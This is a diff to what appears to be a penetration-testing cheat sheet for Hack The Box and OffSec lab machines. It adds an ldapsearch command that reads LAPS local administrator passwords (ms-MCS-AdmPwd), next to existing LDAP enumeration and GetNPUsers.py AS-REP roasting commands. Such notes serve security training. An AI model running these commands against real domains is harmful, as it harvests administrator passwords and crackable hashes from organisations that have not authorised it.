@@ -130,6 +130,7 @@ ldapsearch -H ldap://[IP_ADDR] -x -b "DC=htb,DC=local" '(objectClass=Person)'
 ldapsearch -H ldap://[IP_ADDR] -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName |grep sAMAccountName
 ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" '(name=[group_name])'
 ldapsearch -H ldap://10.10.11.174 -D 'support\[USERNAME]' -w '[PASSWORD]' -b "DC=support,DC=htb" '(objectClass=Person)'
+ldapsearch -v -x -D fmcsorley@hutch.offsec -w [password] -b "DC=hutch,DC=offsec" -H ldap://192.168.132.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 GetNPUsers.py [domain_name]/[Username(optional)]:[Password(optional)] -dc-ip [IP_ADDR] -request     # Eg: GetNPUsers.py scrm.local/ -dc-ip 10.10.11.168 -request
 GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request -no-pass -userfiles username.txt
 ```
